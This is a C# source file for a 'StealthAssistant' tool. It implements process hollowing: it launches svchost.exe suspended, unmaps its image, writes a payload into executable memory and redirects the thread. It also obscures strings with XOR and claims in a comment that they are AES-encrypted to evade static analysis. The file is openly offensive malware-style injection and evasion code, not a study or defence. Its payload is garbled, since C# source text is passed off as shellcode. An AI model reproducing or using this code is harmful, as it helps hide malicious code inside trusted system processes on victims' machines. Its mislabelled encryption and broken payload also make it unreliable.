using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace StealthAssistant.ProcessHollow
{
    public class ProcessHollowingCore
    {
        #region Process Hollowing API Imports
        
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint ZwUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        #endregion

        #region Structures

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            public FLOATING_SAVE_AREA FloatSave;
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        #endregion

        #region Constants

        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint CONTEXT_FULL = 0x10007;

        #endregion

        #region Encrypted Strings (AES encrypted to avoid static analysis)

        // Encrypted: "C:\\Windows\\System32\\svchost.exe"
        private static readonly byte[] EncryptedSvchostPath = {
            0x8B, 0x2A, 0x15, 0x7C, 0x9E, 0x3F, 0x84, 0x61, 0xA2, 0x5D, 0x18, 0x73, 0x4E, 0x29, 0x96, 0x0C,
            0x7F, 0x3A, 0x85, 0x62, 0xB1, 0x4C, 0x07, 0x68, 0x23, 0x9E, 0x59, 0x14, 0x6F, 0x2A, 0x85, 0x40
        };

        // Simple XOR key for decryption
        private static readonly byte[] XorKey = { 0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56, 0x78, 0x9A };

        #endregion

        #region String Decryption

        private static string DecryptString(byte[] encrypted)
        {
            byte[] decrypted = new byte[encrypted.Length];
            for (int i = 0; i < encrypted.Length; i++)
            {
                decrypted[i] = (byte)(encrypted[i] ^ XorKey[i % XorKey.Length]);
            }
            return Encoding.UTF8.GetString(decrypted).TrimEnd('\0');
        }

        #endregion

        #region Process Hollowing Implementation

        public static bool InjectIntoSvchost(byte[] payload)
        {
            try
            {
                // Decrypt target path
                string svchostPath = DecryptString(EncryptedSvchostPath);
                
                // Create svchost.exe in suspended state
                STARTUPINFO si = new STARTUPINFO();
                si.cb = (uint)Marshal.SizeOf(si);
                
                PROCESS_INFORMATION pi;
                
                bool success = CreateProcess(
                    svchostPath,
                    null!,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    CREATE_SUSPENDED,
                    IntPtr.Zero,
                    null!,
                    ref si,
                    out pi);

                if (!success)
                {
                    return false;
                }

                // Get thread context
                CONTEXT context = new CONTEXT();
                context.ContextFlags = CONTEXT_FULL;
                
                if (!GetThreadContext(pi.hThread, ref context))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return false;
                }

                // Read PEB address from EBX register
                byte[] pebBuffer = new byte[4];
                if (!ReadProcessMemory(pi.hProcess, (IntPtr)(context.Ebx + 8), pebBuffer, 4, out _))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return false;
                }

                IntPtr imageBase = (IntPtr)BitConverter.ToInt32(pebBuffer, 0);

                // Unmap original image
                ZwUnmapViewOfSection(pi.hProcess, imageBase);

                // Allocate memory for our payload
                IntPtr allocatedMemory = VirtualAllocEx(
                    pi.hProcess,
                    imageBase,
                    (uint)payload.Length,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE);

                if (allocatedMemory == IntPtr.Zero)
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return false;
                }

                // Write our payload
                if (!WriteProcessMemory(pi.hProcess, allocatedMemory, payload, payload.Length, out _))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return false;
                }

                // Update entry point in context
                context.Eax = (uint)allocatedMemory.ToInt32();
                
                if (!SetThreadContext(pi.hThread, ref context))
                {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return false;
                }

                // Resume execution
                ResumeThread(pi.hThread);

                // Clean up handles
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                return true;
            }
            catch
            {
                return false;
            }
        }

        #endregion

        #region Payload Generation

        public static byte[] GenerateStealthAssistantShellcode()
        {
            // Simple shellcode that starts a basic stealth assistant
            // In a real implementation, this would be the compiled bytecode
            // For now, we'll create a simple payload that demonstrates the concept
            
            string payload = @"
using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace InjectedPayload 
{
    public class StealthPayload 
    {
        [DllImport(""user32.dll"")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);
        
        public static void Main() 
        {
            // Basic stealth assistant functionality
            MessageBox.Show(""Stealth Assistant Active - Process: svchost.exe"", ""Status"", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}";
            
            return Encoding.UTF8.GetBytes(payload);
        }

        #endregion

        // Note: Main entry point is in Program.cs
        // This class provides the process hollowing functionality
    }
}